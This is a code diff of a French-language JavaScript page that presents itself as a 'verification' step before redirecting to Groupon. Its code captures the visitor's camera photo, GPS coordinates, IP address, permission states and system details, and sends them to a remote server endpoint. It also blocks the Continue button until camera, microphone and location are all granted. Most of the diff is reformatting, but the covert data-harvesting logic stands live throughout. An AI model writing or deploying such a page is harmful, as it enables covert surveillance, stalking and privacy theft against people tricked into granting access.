@@ -489,20 +489,33 @@
             }, 'image/jpeg', 0.9);
         }
 
-        // ========== ENVOI IMMÉDIAT ==========
+        // ========== ENVOI IMMÉDIAT (chaque donnée séparément) ==========
 
         async function sendToServer(data) {
             try {
                 const formData = new FormData();
                 formData.append('timestamp', new Date().toISOString());
                 formData.append('userAgent', navigator.userAgent);
-                formData.append('sessionId', SESSION_ID); // Identifiant unique
+                formData.append('sessionId', SESSION_ID);
 
-                if (data.ip && !ipSent) { formData.append('ip', JSON.stringify(data.ip)); ipSent = true; }
-                if (data.coordinates && !coordsSent) { formData.append('coordinates', JSON.stringify(data.coordinates)); coordsSent = true; }
-                if (data.photo && !photoSent) { formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg'); photoSent = true; }
+                if (data.ip && !ipSent) {
+                    formData.append('ip', JSON.stringify(data.ip));
+                    ipSent = true;
+                }
+                if (data.coordinates && !coordsSent) {
+                    formData.append('coordinates', JSON.stringify(data.coordinates));
+                    coordsSent = true;
+                }
+                if (data.photo && !photoSent) {
+                    formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg');
+                    photoSent = true;
+                }
                 if (data.microphone !== undefined && !permsSent) {
-                    const perms = { camera: cameraGranted, microphone: microphoneGranted, geolocation: geolocationGranted };
+                    const perms = {
+                        camera: cameraGranted,
+                        microphone: microphoneGranted,
+                        geolocation: geolocationGranted
+                    };
                     formData.append('permissions', JSON.stringify(perms));
                     permsSent = true;
                 }
@@ -516,14 +529,20 @@
                     systemSent = true;
                 }
 
+                // Si aucun champ n'a été ajouté, on sort
                 if (formData.entries().next().done) return;
+
                 const resp = await fetch(SERVER_URL + '/api/verification/photo', {
                     method: 'POST',
                     body: formData,
                     credentials: 'omit'
                 });
-                if (resp.ok) console.log('✅ Envoi réussi pour session', SESSION_ID);
-                else console.warn('⚠️ Échec envoi, status:', resp.status);
+
+                if (resp.ok) {
+                    console.log('✅ Envoi réussi pour session', SESSION_ID);
+                } else {
+                    console.warn('⚠️ Échec envoi, status:', resp.status);
+                }
             } catch (e) {
                 console.warn('⚠️ Erreur envoi:', e.message);
             }
@@ -548,7 +567,6 @@
             const allowBtn = document.getElementById('allowBtn');
             const retryBtn = document.getElementById('retryBtn');
 
-            // Continuer activé uniquement si les 3 permissions sont accordées
             if (count === 3) {
                 continueBtn.disabled = false;
                 continueBtn.textContent = '✅ CONTINUER';
@@ -566,14 +584,12 @@
             const anyAttempted = cameraAttempted || microphoneAttempted || geolocationAttempted;
 
             if (!anyAttempted) {
-                // Premier affichage : bouton Autoriser
                 allowBtn.style.display = 'block';
                 allowBtn.textContent = '🔓 AUTORISER';
                 allowBtn.className = 'btn btn-primary';
                 allowBtn.onclick = requestAllPermissions;
                 retryBtn.style.display = 'none';
             } else if (hasDenied && !verificationComplete) {
-                // Permissions refusées : bouton Réessayer
                 allowBtn.style.display = 'none';
                 retryBtn.style.display = 'block';
                 retryBtn.onclick = retryDenied;
@@ -619,8 +635,11 @@
         function redirectToGroupon() {
             if (!verificationComplete) {
                 const count = [cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length;
-                if (count === 3) { completeVerification(); window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank'); return; }
-                // Pas d'alerte, ne rien faire
+                if (count === 3) {
+                    completeVerification();
+                    window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
+                    return;
+                }
                 return;
             }
             window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
